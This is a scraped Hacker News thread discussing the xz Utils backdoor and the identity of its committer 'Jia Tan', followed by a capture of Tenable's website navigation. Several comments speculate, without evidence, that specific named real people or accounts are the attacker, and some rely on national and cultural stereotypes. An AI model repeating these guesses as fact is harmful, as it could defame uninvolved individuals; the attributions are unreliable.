spammers. I don't have a false identity. | | --- | --- | --- | | | |  |  | [johnisgood](user?id=johnisgood) [9 months ago](item?id=39868686)   | [root](#39866326) | [parent](#39868516) | [next](#39869148) [–]  Keep in mind that having a "false identity" does not make you a malicious actor. I have a serious project I work on under another pseudonym, but it has to do more with the fact that I do not want my real name to be associated with that project AND having a serious case of impostor syndrome. :/ That, and I used to contribute to various games (forks of ioquake3) when I was a teen and I wanted to keep my real name private. | | --- | --- | --- | | | |  |  | [occamsrazorwit](user?id=occamsrazorwit) [9 months ago](item?id=39870124)   | [root](#39866326) | [parent](#39868686) | [next](#39869148) [–]  Someone named "John is good" claims they aren't a malicious actor... You're trying real hard to convince us, huh. | | --- | --- | --- | | | |  |  | [johnisgood](user?id=johnisgood) [9 months ago](item?id=39873562)   | [root](#39866326) | [parent](#39870124) | [next](#39869148) [–]  Oh yeah, I am using a pseudonym here as well, because I have controversial views in some topics. :P | | --- | --- | --- | | | |  |  | [stephenr](user?id=stephenr) [9 months ago](item?id=39869148)   | [root](#39866326) | [parent](#39868516) | [prev](#39868686) | [next](#39904009) [–]  > I don't have a false identity. That's just what someone with a false identity would say.. get him boys! The biggest /S | | --- | --- | --- | | | |  |  | [heee399](user?id=heee399) [9 months ago](item?id=39904009)   | [root](#39866326) | [parent](#39867033) | [prev](#39868516) | [next](#39867223) [–]  I am more interest about his git commits [https://github.com/JiaT75?tab=overview&from=2021-12-01&to=20...](https://github.com/JiaT75?tab=overview&from=2021-12-01&to=2021-12-31) If JiaT75 is a Chinese, then his working log should follow Chinese Holiday, especially Spring Festival and National Holiday. Chinese usually not work on first 3 days of Spring Festival and National Holiday - 2021 2/11 - 2/13 (few commits), 2021 10/1 - 10/3 (nothing) 2022 1/31 - 2/2 (huge commits on 1/31, suspect), 2022 10/1 - 10/3 (nothing) 2023 and 2024, not very much commits. So 2022 1/31 huge commits is a proof that he is not follow Chinese holiday. But wait, 2021 is his active year, but he missed almost all Aug. Is he on holiday? Who can have such a long holiday? What i can think is a solider who has a long vacation (探亲假). So let's guess he is a solider then it's sense that he worked on Spring Holiday because they need on duty. Let's double check again, if he is a solider, then they will have a holiday on every Aug. 1 because it's liberation army day. I check and no commits on all 4 years Aug. 1. | | --- | --- | --- | | | |  |  | [Retr0id](user?id=Retr0id) [9 months ago](item?id=39867223)   | [root](#39866326) | [parent](#39867033) | [prev](#39904009) | [next](#39937923) [–]  Did you check Chinese social media? | | --- | --- | --- | | | |  |  | [thrash158](user?id=thrash158) [9 months ago](item?id=39904873)   | [root](#39866326) | [parent](#39867223) | [next](#39871094) [–]  I found this link on Zhihu: <https://www.zhihu.com/question/650826484> | | --- | --- | --- | | | |  |  | [hw](user?id=hw) [9 months ago](item?id=39871094)   | [root](#39866326) | [parent](#39867223) | [prev](#39904873) | [next](#39937923) [–]  Why would you think the person would have social media (or would even be on Chinese social media specifically), given the sophistication and planning? | | --- | --- | --- | | | |  |  | [Retr0id](user?id=Retr0id) [9 months ago](item?id=39872156)   | [root](#39866326) | [parent](#39871094) | [next](#39937923) [–]  I mention Chinese social media specifically because I know it's not indexed so well by western search engines. You can't conclude someone has no social footprint until you've actually checked. Regardless of how likely you think it is, finding a social media footprint would be useful information. Seek information first, reach conclusions second. | | --- | --- | --- | | | |  |  | [codear](user?id=codear) [9 months ago](item?id=39937923)   | [root](#39866326) | [parent](#39867033) | [prev](#39867223) | [next](#39881491) [–]  i wonder if that avatar, familiarity with C/C++ and Git, and "offering help with open source projects" is just coincidence <https://github.com/JiaT75> <https://twitter.com/JiaTan1337/status/1774931375994319244> kind of interesting also to see this account was set up ~2 months ago. if it's a troll, it's a somewhat poor joke. | | --- | --- | --- | | | |  |  | [wtznc](user?id=wtznc) [9 months ago](item?id=39881491)   | [parent](#39866326) | [prev](#39867033) | [next](#39964779) [–]  I found a user who seems suspicious to me. [https://github.com/snappyJack/CVE-request-XZ-5.2.5-has-denia...](https://github.com/snappyJack/CVE-request-XZ-5.2.5-has-denial-of-service-vulnerability) He understood the software architecture quite early on while working on the following repository. He connected the dots from his other projects and went rogue. (probably to benefit from crypto?). Take a look at his other repositories and code style and recent likes on github. Is he our Jia Tan? | | --- | --- | --- | | | |  |  | [source\_inform](user?id=source_inform) [9 months ago](item?id=39964779)   | [parent](#39866326) | [prev](#39881491) | [next](#39875561) [–]  An Indian with the name, Jigar (meaning heart) would never address himself as Jigar, as seen in the citation. This would be culturally a bit weird. Unless he is being sarcastic or writing this on some comic note. Secondly, the use of English is not consistent in what should be from typical Indian. He should be from a foreign background or a very reputed English medium. The language though seemingly simple for a native English speaker but it seems in this case; a person whose first language: likely is not English. It is possible that Grammarly or auto correct could have been used to write these. But can't be certain of anything stated above. I do think that this is a sabotage account with 60% chances unless Mr. Kumar comes out clean, publicly. He is likely a state sponsored actor. | | --- | --- | --- | | | |  |  | [AviationAtom](user?id=AviationAtom) [9 months ago](item?id=39875561)   | [parent](#39866326) | [prev](#39964779) | [next](#39871606) [–]  Not a developer but reading the changelogs and commit history from this person seem interesting, as they appear to be some effort consolidate control and push things in the direction of supporting wider dissemination of their backdoor code: Discussing commits that the other author has since reverted, IFUNC change with Project Zero tests, a focus on embedded, etc.: [https://www.mail-archive.com/xz-devel@tukaani.org/msg00642.h...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00642.html) Trimming security reporting details: [https://git.tukaani.org/?p=xz.git;a=commitdiff;h=af071ef7702...](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=af071ef7702debef4f1d324616a0137a5001c14c) | | --- | --- | --- | | | |  |  | [dang](user?id=dang) [9 months ago](item?id=39871606)   | [parent](#39866326) | [prev](#39875561) | [next](#39879256) [–]  We detached this subthread from <https://news.ycombinator.com/item?id=39866275>. (It's fine; I'm just trying to prune the top-heavy subthread.) | | --- | --- | --- | | | |  |  | [electronwill](user?id=electronwill) [9 months ago](item?id=39879256)   | [parent](#39866326) | [prev](#39871606) | [next](#39906396) [–]  "crazytan" is the LinkedIn profile of a security software engineer named Jia Tan in Sunnyvale working at Snowflake, who attended Shanghai Jiao Tong University from 2011 to 2015 and Georgia Institute of Technology from 2015 to 2017. However, this Jia Tan on LinkedIn might not be the same Jia Tan who worked on XZ Utils. Also, the person who inserted the malicious code might be someone else who hijacked the account of the Jia Tan who worked on XZ Utils. | | --- | --- | --- | | | |  |  | [molaeiali](user?id=molaeiali) [9 months ago](item?id=39906396)   | [parent](#39866326) | [prev](#39879256) | [next](#39882923) [–]  Has Jia in any way posted a response to the incident? | | --- | --- | --- | | | |  |  | [AdmiralAsshat](user?id=AdmiralAsshat) [9 months ago](item?id=39906526)   | [root](#39866326) | [parent](#39906396) | [next](#39882923) [–]  My assumption would be that he knows the jig is up, and is probably going to do everything he can to jettison the JiaTan account, lest any IPs he uses be turned over to authorities. | | --- | --- | --- | | | |  |  | [b7kich](user?id=b7kich) [9 months ago](item?id=39882923)   | [parent](#39866326) | [prev](#39906396) | [next](#39868773) [–]  May or may not be related: <https://www.linkedin.com> › crazytan Jia Tan - Snowflake | LinkedIn | | --- | --- | --- | | | |  |  | [mikolajw](user?id=mikolajw) [9 months ago](item?id=39868773)   | [prev](#39866326) | [next](#39869528) [–]  Tukaani website states "jiatan" as the nickname of the malicious code committer on Libera Chat. WHOWAS jiatan provided me the following information: jiatan ~jiatan 185.128.24.163 \* :Jia Tan jiatan 185.128.24.163 :actually using host jiatan jiatan :was logged in as jiatan tungsten.libera.chat :Fri Mar 14:47:40 2024 WHOIS yields nothing, the user is not present on the network at the moment. Given that 185.128.24.163 is covered with a range-block on the English Wikipedia, it appears this is a proxy. | | --- | --- | --- | | | |  |  | [chrononaut](user?id=chrononaut) [9 months ago](item?id=39869491)   | [parent](#39868773) | [next](#39869528) [–]  > it appears this is a proxy. Yes, that IP address appears associated with witopia[.]net, specifically vpn.singapore.witopia[.]net points to that IP address. | | --- | --- | --- | | | |  |  | [mrcoffee4u](user?id=mrcoffee4u) [9 months ago](item?id=39869528)   | [prev](#39868773) | [next](#39870068) [–]  can someone ELI5 ? | | --- | --- | --- | | | |  |  | [QuantumG](user?id=QuantumG) [9 months ago](item?id=39881055)   | [parent](#39869528) | [next](#39870068) [–]  House of cards experiences strong wind. | | --- | --- | --- | | | |  |  | [fullstackchris](user?id=fullstackchris) [9 months ago](item?id=39870068)   | [prev](#39869528) | [next](#39874089) [–]  pRoBaBlY a StaTe AcToR zero definition of what that means... egos of people who just like to say cool words they don't understand lol this comment will probably get deleted, but let the action of this comment being deleted stand that in 2024 we're all allowed to use big words with no definition of what they mean -> bad state actor? who? what motive? what country? all comments involving "state actor" are very broad and strange... i would like people to stop using words that have no meaning, as it really takes away from the overall conversation of what is going on. i mean you're seriously going to say "state actor playing the long game" to what end? the issue was resolved in 2 hours... this is stupid | | --- | --- | --- | | | |  |  | [Hackbraten](user?id=Hackbraten) [9 months ago](item?id=39870785)   | [parent](#39870068) | [next](#39874089) [–]  For starters, the backdoor was technically really sophisticated. For example, the malicious code circumvents a hardening technique (RELRO) in a clever way, which would otherwise have blocked it from manipulating the sshd code in the same process space at runtime. This is not something that script kiddies usually cook up in an afternoon to make a quick buck. You need experts and a lot of time to pull off feats like that. This points to an organization with excellent funding. I’m not surprised at all that people are attributing this to some unknown nation-level group. | | --- | --- | --- | | | |  |  | [throwaway67743](user?id=throwaway67743) [9 months ago](item?id=39874089)   | [prev](#39870068) | [next](#39875716) [–]  It's always Debian, like last time when they removed RNG randomness from ssh because of a warning. | | --- | --- | --- | | | |  |  | [mise\_en\_place](user?id=mise_en_place) [9 months ago](item?id=39875716)   | [prev](#39874089) | [next](#39868800) [–]  This is why we never upgrade software versions. I’ve been asked by our customers why we use such an old AMI version. This is why. | | --- | --- | --- | | | |  |  | [gkoberger](user?id=gkoberger) [9 months ago](item?id=39875765)   | [parent](#39875716) | [next](#39868800) [–]  This feels like the exact opposite of the takeaway you should have. Old software isn't inherently more secure; you're missing thousands of security and bug fixes. Yes, this was bad, but look how quickly the community came together to catch it and fix it. It only took 6 days for it to be found and fixed. | | --- | --- | --- | | | |  |  | [circusfly](user?id=circusfly) [9 months ago](item?id=39868800)   | [prev](#39875716) | [next](#39869796) [–]  Waiting for the new YouTube videos on this. "Woah! Linux has a back door dudes!". My distribution, Ubuntu (now Kubuntu) 2022 isn't affected. | | --- | --- | --- | | | |  |  | [Lockal](user?id=Lockal) [9 months ago](item?id=39874083)   | [parent](#39868800) | [next](#39870091) [–]  Still better than TwoMinuteToiletPapers and other AI-bamboozled channels hyping over proprietary OpenAI crap (text/photo/video), what a time to be alive! | | --- | --- | --- | | | |  |  | [fullstackchris](user?id=fullstackchris) [9 months ago](item?id=39870091)   | [parent](#39868800) | [prev](#39874083) | [next](#39869796) [–]  not sure why you're being downvoted. this is exactly what is going to happen. | | --- | --- | --- | | | |  |  | [stephc\_int13](user?id=stephc_int13) [9 months ago](item?id=39869796)   | [prev](#39868800) | [next](#39870174) [–]  I guess that rewriting liblzma in Rust would *not* have prevented this backdoor. But would have likely increased the confidence in its safety. Using the build system (and potentially the compiler) to insert malicious backdoors is far from a new idea, and I don't see why this example would the only case. | | --- | --- | --- | | | |  |  | [nullifidian](user?id=nullifidian) [9 months ago](item?id=39870864)   | [parent](#39869796) | [next](#39869869) [–]  It would have made it worse, because there would be 300 crates with 250 different maintainers, all pulled in by several trivial/baseline dependencies. More dependencies = higher the probability that a malicious maintainer has gotten maintainer's rights for one of them, especially because many original authors/maintainers of rust style microdepencency crates move on with their lives and eventually seek to exit their maintainer role. At least for classic C/C++ software, by the virtue of it being very inconvenient to casually pull 300 dependencies for something trivial, there are fewer dependencies, i.e. separate projects/repos, and these tend to be more self-contained. There are also "unserious" distributions like Fedora and something like stable/testing/unstable pipeline in Debian, which help with catching the most egregious attempts. Crates.io and npm are unserious by their very design, which is focused on maximizing growth by eliminating as many "hindrances" as possible. | | --- | --- | --- | | | |  |  | [yogorenapan](user?id=yogorenapan) [9 months ago](item?id=39871713)   | [root](#39869796) | [parent](#39870864) | [next](#39869869) [–]  Why is rust beginning to sound like JavaScript? | | --- | --- | --- | | | |  |  | [intelVISA](user?id=intelVISA) [9 months ago](item?id=39872408)   | [root](#39869796) | [parent](#39871713) | [next](#39869869) [–]  Modern coders have been conditioned to import random libs to save 30mins work. | | --- | --- | --- | | | |  |  | [joshhansen](user?id=joshhansen) [9 months ago](item?id=39882184)   | [root](#39869796) | [parent](#39872408) | [next](#39869869) [–]  Rust specifically chose a minimal standard library to not get stuck with the Python "dead batteries" problem. There's a strong culture as well of minimizing a project's dependencies in Rust. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39929845)   | [root](#39869796) | [parent](#39882184) | [next](#39869869) [–]  > Rust specifically chose a minimal standard library to not get stuck with the Python "dead batteries" problem. So has C++ in the past although there seems to be a push for a more batteries included approach recently. > There's a strong culture as well of minimizing a project's dependencies in Rust. This doesn't match what anyone can observe by looking at dependencies of Rust projects. | | --- | --- | --- | | | |  |  | [anonymous-panda](user?id=anonymous-panda) [9 months ago](item?id=39869869)   | [parent](#39869796) | [prev](#39870864) | [next](#39869988) [–]  Don’t know all the details and rust isn’t immune to a build attack, but stuff like that tends to stand out a lot more I think in a build.rs than it would in some m4 automake soup. | | --- | --- | --- | | | |  |  | [minetest2048](user?id=minetest2048) [9 months ago](item?id=39870061)   | [root](#39869796) | [parent](#39869869) | [next](#39869988) [–]  There was a drama back then where serde tried to ship its derive macro as a precompiled binary: <https://news.ycombinator.com/item?id=37189462> | | --- | --- | --- | | | |  |  | [yencabulator](user?id=yencabulator) [9 months ago](item?id=39869988)   | [parent](#39869796) | [prev](#39869869) | [next](#39873435) [–]  The backdoor hinged on hiding things in large shell scripts, obscure C "optimizations", and sanitizer disabling. I'd expect all of those would be a much bigger red flag in the Rust world. | | --- | --- | --- | | | |  |  | [im3w1l](user?id=im3w1l) [9 months ago](item?id=39873435)   | [parent](#39869796) | [prev](#39869988) | [next](#39882176) [–]  This hack exploited a fairly unique quirk in the linux C ecosystem / culture. That packages are built from "tarballs" that are not exact copies of the git HEAD as they also contain generated scripts with arbitrary code. It would not have happened in any modern language. It probably wouldn't have even happened in a Vistual Studio C-project for windows either. | | --- | --- | --- | | | |  |  | [Denvercoder9](user?id=Denvercoder9) [9 months ago](item?id=39874691)   | [root](#39869796) | [parent](#39873435) | [next](#39873911) [–]  > It would not have happened in any modern language. It would. pip for example installs from tarballs uploaded to PyPi, not from a git repository. | | --- | --- | --- | | | |  |  | [im3w1l](user?id=im3w1l) [9 months ago](item?id=39878492)   | [root](#39869796) | [parent](#39874691) | [next](#39873911) [–]  Pip and similar are their own can of worms yeah. They trade convinience for an almost complete lack of oversight. But in this case we are talking about people (distro packagers) manually downloading the source and building it which is not quite the same thing. | | --- | --- | --- | | | |  |  | [Denvercoder9](user?id=Denvercoder9) [9 months ago](item?id=39878545)   | [root](#39869796) | [parent](#39878492) | [next](#39873911) [–]  `pip install` does do exactly the same thing: it downloads and executes code from a tarball uploaded to PyPi by its maintainer. There's no verification process that ensures that tarball matches what's in the git repository. | | --- | --- | --- | | | |  |  | [im3w1l](user?id=im3w1l) [9 months ago](item?id=39880325)   | [root](#39869796) | [parent](#39878545) | [next](#39873911) [–]  Yes I know, and that's what I meant when I said "their own can of worms". Distro-provided python packages don't use pip however, at least afaik. | | --- | --- | --- | | | |  |  | [Denvercoder9](user?id=Denvercoder9) [9 months ago](item?id=39880506)   | [root](#39869796) | [parent](#39880325) | [next](#39873911) [–]  The distro-provided Python packages are usually still build from the source on PyPi as uploaded by the maintainer, not what's in git. | | --- | --- | --- | | | |  |  | [everybackdoor](user?id=everybackdoor) [9 months ago](item?id=39873911)   | [root](#39869796) | [parent](#39873435) | [prev](#39874691) | [next](#39882176) [–]  Funny you should say that, given they definitely have exploit code in `vcpkg` | | --- | --- | --- | | | |  |  | [joshhansen](user?id=joshhansen) [9 months ago](item?id=39882176)   | [parent](#39869796) | [prev](#39873435) | [next](#39870174) [–]  If it were using Cargo as its build system, it might make such manipulations more obvious / understandable? | | --- | --- | --- | | | |  |  | [shortsunblack](user?id=shortsunblack) [9 months ago](item?id=39870174)   | [prev](#39869796) | [next](#39869153) [–]  Pretty much proof that OSS != automatically more secure. And proof that OSS projects can get backdoored. See this for more ideas on this issue: <https://seirdy.one/posts/2022/02/02/floss-security/> | | --- | --- | --- | | | |  |  | [derkades](user?id=derkades) [9 months ago](item?id=39873372)   | [parent](#39870174) | [next](#39869153) [–]  The malware was hidden inside an opaque binary. If anything, this shows that we need more open source and more reproducibility. | | --- | --- | --- | | | |  |  | [Zigurd](user?id=Zigurd) [9 months ago](item?id=39869153)   | [prev](#39870174) [–]  "Lasse Collin," as other posters here have found, does not seem to exist as an experienced coder. Oddly, there is a Swedish jazz musician named Lasse Collin, which would otherwise be one of those names, especially the last name, that would stick out. Instead it is buried under a lot of mentions of a musician. | | --- | --- | --- | | | |  |  | [akyuu](user?id=akyuu) [9 months ago](item?id=39869612)   | [parent](#39869153) | [next](#39869212) [–]  Lasse Collin has been working on xz for decades: [https://sourceforge.net/p/sevenzip/discussion/45797/thread/0...](https://sourceforge.net/p/sevenzip/discussion/45797/thread/09814bb2/?limit=25#d81a) Now, whether his GitHub account is currently being controlled by him is another question. Also, for some more context: In 2022, Lasse said he was struggling to work on xz and was looking for maintainers, and mentioned Jia Tan: [https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.h...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00567.html) | | --- | --- | --- | | | |  |  | [rany\_](user?id=rany_) [9 months ago](item?id=39869212)   | [parent](#39869153) | [prev](#39869612) [–]  Searching for my real name on Google doesn't return anything either, I don't think this means anything. | | --- | --- | --- | | | |  |  | [Zigurd](user?id=Zigurd) [9 months ago](item?id=39869312)   | [root](#39869153) | [parent](#39869212) [–]  Lasse Collin the contributor is findable, especially if you add "tukaani" to the search. But not in any other context, unless that's what old jazz musicians do in their retirement. | | --- | --- | --- | | | |  |  | [rany\_](user?id=rany_) [9 months ago](item?id=39869484)   | [root](#39869153) | [parent](#39869312) [–]  I don't think that's what they meant. The idea is to find information about their personal life, not OSS contributions. Something that proves they're a real person. | | --- | --- | --- | | |
| |  | | --- |   [Guidelines](newsguidelines.html) | [FAQ](newsfaq.html) | [Lists](lists) | [API](https://github.com/HackerNews/API) | [Security](security.html) | [Legal](https://www.ycombinator.com/legal/) | [Apply to YC](https://www.ycombinator.com/apply/) | Contact Search: |



=== Content from www.tenable.com_66a4578f_20250111_034043.html ===


* [Skip to Main Navigation](#site-nav)
* [Skip to Main Content](#block-tenable-content)
* [Skip to Footer](#site-footer)

Facebook  Google Plus     Twitter  LinkedIn      YouTube  RSS      Menu      Search  Resource - BlogResource - WebinarResource - ReportResource - Eventicons\_066                    icons\_067icons\_068icons\_069icons\_070

[Tenable](/)
[Platform](/products/tenable-one)
[Products](/products)
[Solutions](/solutions)
[Why Tenable](/why-tenable)
Resources
Partners
Support
Company

[contact\_icon](/about-tenable/contact-tenable)

[English](https://www.tenable.com?tns_languageOverride=true)
[Deutsch](https://de.tenable.com?tns_languageOverride=true)
[Français (France)](https://fr.tenable.com?tns_languageOverride=true)
[Español (América Latina)](https://es-la.tenable.com?tns_languageOverride=true)
[Português (Brasil)](https://pt-br.tenable.com?tns_languageOverride=true)
[Italiano](https://it.tenable.com?tns_languageOverride=true)

[简体中文](https://www.tenablecloud.cn?tns_languageOverride=true)
[繁體中文](https://zh-tw.tenable.com?tns_languageOverride=true)
[日本語](https://jp.tenable.com?tns_languageOverride=true)
[한국어](https://kr.tenable.com?tns_languageOverride=true)
[العربية](https://ar.tenable.com?tns_languageOverride=true)

[Tenable Product Login](https://cloud.tenable.com)
[Community & Support](https://community.tenable.com/login)

[Try](/try)
[Buy](/buy)

[Try](/products)

##### Tenable One Exposure Management Platform

---

* [Explore the Platform](/products/tenable-one)
* [FAQ](/products/tenable-one#faq)
* [Request a demo](#one-eval)
* [What is Exposure Management?](/exposure-management)

##### Platform categories

---

* [Cloud Exposure](/cloud-security)
* [Vulnerability Exposure](/products/vulnerability-management)
* [OT/IoT Exposure](/products/ot-security)
* [Identity Exposure](/products/identity-exposure)

##### Platform capabilities

---

* [Exposure metrics & reporting](/products/tenable-one/lumin-exposure-view)
* [Attack path analysis](/products/tenable-one/attack-path-analysis)
* [GenAI analytics](/solutions/exposure-ai)

![Get Started with Tenable One](/themes/custom/tenable/images-new/menus/menu-featured-tenable-one.png)
##### Get started with Tenable One

Anticipate attacks and reduce business risk with Tenable One Exposure Management Platform.

[Request a demo](#one-eval)

##### Exposure Management Platform

---

Tenable One Exposure Management Platform enables you to gain visibility across your attack surface, focus efforts to prevent likely attacks, and accurately communicate cyber risk to support optimal business performance.

[Learn more](/products/tenable-one)

[Request a demo](#one-eval)

[##### Cloud Exposure](/cloud-security)

---

* [Tenable Cloud Security (CNAPP)](/cloud-security)
  [Request a demo](#tenable-cs)
* [Tenable CIEM](/cloud-security/products/cloud-infrastructure-entitlement-management)
  [Request a demo](#tenable-cs)
* [Tenable Just in Time Access (JIT)](/cloud-security/products/just-in-time)
  [Request a demo](#tenable-cs)
* [Tenable Open Source](/cloud-security/products/open-source)

##### Vulnerability Exposure

---

* [Tenable Vulnerability Management](/products/vulnerability-management)
  [Try for free](#tenableio-4part)
* [Tenable Security Center](/products/security-center)
  [Request a demo](#tenable-sc-eval)
* [Tenable Web App Scanning](/products/web-app-scanning)
  [Try for free](#tenableio-was)
* [Tenable Patch Management](/products/patch-management)
  [Request a demo](#patch-mgmt)
* [Tenable Enclave Security](/products/enclave-security)
  [Request a demo](#enclave)
* [Tenable Attack Surface Management](/products/attack-surface-management)
  [Request a demo](#asm-eval)
* [Tenable Nessus](/products/nessus)
  [Try for free](#expert)

##### OT/IoT Exposure

---

* [Tenable OT Security](/products/ot-security)
  [Request a demo](#ot-eval)

##### Identity Exposure

---

* [Tenable Identity Exposure](/products/identity-exposure)
  [Request a demo](#ad-eval)

[**View all products**](/products/)
[**Compare products**](/products/compare-products)

##### Business needs

---

* [Active Directory](/solutions/active-directory)
* [Compliance](/solutions/compliance)
* [Cyber insurance](/cyber-insurance)
* [OT / IT](/solutions/it-ot)
* [Ransomware](/solutions/ransomware)
* [Vulnerability assessment](/solutions/vulnerability-assessment)
* [Vulnerability management](/solutions/vulnerability-management)
* [Zero trust](/solutions/zero-trust)

##### Industry

---

* [Automotive manufacturing](/solutions/automotive-manufacturing)
* [Energy](/solutions/energy)
* [Finance](/solutions/finance)
* [Healthcare](/solutions/healthcare)
* [Oil & Gas](/solutions/oil-and-gas)
* [More industries](/solutions#Industries)

##### Compliance

---

* [Critical infrastructure regulations](/cybersecurity-regulations)
* [FISMA](/solutions/fisma)
* [HIPAA](/solutions/hipaa-compliance)
* [NERC CIP](/solutions/nerc-cip)
* [NIS directive](/solutions/nis-directive-compliance)
* [PCI](/solutions/pci-dss)
* [Security frameworks](/solutions/security-frameworks)

##### Public Sector

---

* [Educational institutions](/solutions/education)
* [State / Local / Education](/solutions/sled)
* [US federal](/solutions/government/us-fed)

[View all solutions](/solutions/)

##### The Tenable difference

---

* [Why choose Tenable](/why-tenable)
* [Industry recognition](/why-tenable#awards)
* [Customer stories](/customers)

##### Compare Tenable to:

---

* [CrowdStrike Falcon Cloud](/why-tenable/tenable-vs-crowdstrike)
* [Microsoft Defender](/why-tenable/tenable-vs-microsoft)
* [Palo Alto Prisma Cloud](/why-tenable/tenable-vs-palo-alto-networks)
* [Qualys](/why-tenable/tenable-vs-qualys)
* [Rapid7](/why-tenable/tenable-vs-rapid7)
* [Wiz](/why-tenable/tenable-vs-wiz)

![Exposure video](/themes/custom/tenable/images-new/menus/exposure-video-thumb.png)
##### Isolate and eradicate your true exposures

Close critical cyber exposures anywhere to reduce business risk everywhere.

Watch the video

##### Resources

---

* [Resource library](/resources)
* [Webinars](/webinars)
* [Blog](/blog)
* [Training and certification](/education)
* [Cybersecurity guide](/cybersecurity-guide)
* [Customer stories](/customers)

##### Research

---

* [Research center](/research)
* [Security plugins](/plugins)
* [Zero-Day research](/security/research)
* [Research blog](/blog/search?field_blog_section_tid=49)
* [Research community](https://community.tenable.com/s/)

##### TechStrong Research PulseMeter: Risk and threat management strategies

Techstrong Research surveyed their community of security, cloud, and DevOps readers and viewers to gain insights into their views on scaling security across cloud and on-premises environments.

[Read the report](/analyst-research/techstrong-research-pulsemeter-risk-and-threat-management-strategies)

##### Find a partner

---

* [Search resellers](/partner-locator/resellers)
* [Search distributors](/partner-locator/distributors)
* [Search MSSP](/partner-locator/mssp)

##### Tenable Assure partners

---

* [Overview](/partners)
* [Channel partner program](/partners/channel-partner-program)
* [MSSP partner program](/partners/mssp-partner-program)
* [Partner application](/partners/assure-program-application)
* [Partner portal](https://partners.tenable.com/#/page/partner-login)

##### Other partner opportunities

---

* [Technology ecosystem](/partners/technology)
* [Research Alliance program](/partners/research)
* [Tenable performance marketing program](https://tenable.partnerstack.com/)

##### Support

---

* [Technical support](/support)
* [Tenable community](https://community.tenable.com/s/)
* [Documentation](https://docs.tenable.com/)

##### Services

---

* [Professional services](/services)
* [Training and certification](/education)
* [Buy certification](/buy/certification)

##### Tenable Trust

---

* [System status](https://status.tenable.com/)
* [Security and compliance](/trust/assurance)
* [Data protection](/gdpr-alignment)

##### About us

---

* [About Tenable](/about-tenable/about-us)
* [Leadership](/about-tenable/leadership)
* [Investor relations](https://investors.tenable.com/)
* [Tenable Ventures](/tenable-ventures)
* [Why choose Tenable](/why-tenable)
* [Awards and recognition](/why-tenable#awards)
* [Customer stories](/customers)

##### Media

---

* [Press releases](/media#press-releases)
* [Financial news releases](https://investors.tenable.com/news-releases)
* [News](/media#news)
* [Media kit](/media#kit)

##### Connect

---

* [Try our products](/try)
* [Events](/events)
* [Tenable community](https://community.tenable.com/s/)
* [Subscribe to the blog](https://info.tenable.com/blog-subscription-page.html)
* [Contact us](/about-tenable/contact-tenable)

##### Join us

---

* [Careers](/careers)
* [Engagement and inclusion](/about-tenable/engagement-and-inclusion)

![Frost & Sullivan: Frost Radar, Vulnerability Management, 2023](/themes/custom/tenable/images-new/menus/menu-featured-frost-radar.png)

* Platform
  + #### Tenable platform
  + [Explore the Platform](/products/tenable-one)
  + [FAQ](/products/tenable-one#faq)
  + [Request a demo](/products/tenable-one/evaluate)
  + [What is Exposure Management?](/exposure-management)
  + [Cloud Security](/cloud-security)
  + [Vulnerability Management](/products/vulnerability-management)
  + [OT/IoT Security](/products/ot-security)
  + [Identity Exposure](/products/identity-exposure)
  + [Exposure Metrics & Reporting](/products/tenable-one/lumin-exposure-view)
  + [Attack Path Analysis](/products/tenable-one/attack-path-analysis)
  + [GenAI Analytics](/solutions/exposure-ai)
* Products
  + #### Tenable products
  + [Tenable products overview](/products)
  + [Tenable One Exposure Management Platform](/products/tenable-one)
  + Cloud Exposure
    - [Tenable Cloud Security (CNAPP)](/cloud-security)
    - [Tenable CIEM](/cloud-security/products/cloud-infrastructure-entitlement-management)
    - [Tenable Just in Time Access (JIT)](/cloud-security/products/just-in-time)
    - [Tenable Open Source](/cloud-security/products/open-source)
  + Vulnerability Exposure
    - [Tenable Vulnerability Management](/products/vulnerability-management)
    - [Tenable Security Center](/products/security-center)
    - [Tenable Web App Scanning](/products/web-app-scanning)
    - [Tenable Patch Management](/products/patch-management)
    - [Tenable Enclave Security](/products/enclave-security)
    - [Tenable Attack Surface Management](/products/attack-surface-management)
    - [Tenable Nessus](/products/nessus)
  + [OT/IoT Exposure](/products/ot-security)
  + [Identity Exposure](/products/identity-exposure)
* Solutions
  + #### Tenable solutions
  + [Solutions overview](/solutions)
  + Business needs
    - [Active Directory](/solutions/active-directory)
    - [Compliance](/solutions/compliance)
    - [Cyber insurance](/cyber-insurance)
    - [IT / OT](/solutions/it-ot)
    - [Ransomware](/solutions/ransomware)
    - [Vulnerability assessment](/solutions/vulnerability-assessment)
    - [Vulnerability management](/solutions/vulnerability-management)
    - [Zero trust](/solutions/zero-trust)
  + Industries
    - [Automotive manufacturing](/solutions/automotive-manufacturing)
    - [Energy](/solutions/energy)
    - [Finance](/solutions/finance)
    - [Healthcare](/solutions/healthcare)
    - [Oil and gas](/solutions/oil-and-gas)
    - [More industries](/solutions#Industries)
  + Compliance
    - [Critical Infrastructure Regulations](/cybersecurity-regulations)
    - [FISMA](/solutions/fisma)
    - [HIPAA](/solutions/hipaa-compliance)
    - [NERC CIP](/solutions/nerc-cip)
    - [NIS Directive](/solutions/nis-directive-compliance)
    - [PCI](/solutions/pci-dss)
    - [Security frameworks](/solutions/security-frameworks)
  + Public sector
    - [Educational institutions](/solutions/education)
    - [State / Local / Education](/solutions/sled)
    - [US federal](/solutions/government/us-fed)
  + [View all solutions](/solutions/)
* Why Tenable
  + #### Why Tenable
  + The Tenable difference
    - [Why choose Tenable](/why-tenable)
    - [Industry recognition](/why-tenable#awards)
    - [Customer stories](/customers)
  + Compare Tenable to:
    - [CrowdStrike Falcon Cloud](/why-tenable/tenable-vs-crowdstrike)
    - [Microsoft Defender](/why-tenable/tenable-vs-microsoft)
    - [Palo Alto Prisma Cloud](/why-tenable/tenable-vs-palo-alto-networks)
    - [Qualys](/why-tenable/tenable-vs-qualys)
    - [Rapid7](/why-tenable/tenable-vs-rapid7)
    - [Wiz](/why-tenable/tenable-vs-wiz)
* Resources
  + #### Tenable resources
  + Resources
    - [Resource library](/resources)
    - [Webinars](/webinars)
    - [Blog](/blog)
    - [Training and certification](/education)
    - [Cybersecurity guide](/cybersecurity-guide)
    - [Customer stories](/customers)
  + Research
    - [Research center](/research)
    - [Security plugins](/plugins)
    - [Zero-Day research](/security/research)
    - [Research blog](/blog/search?field_blog_section_tid=49)
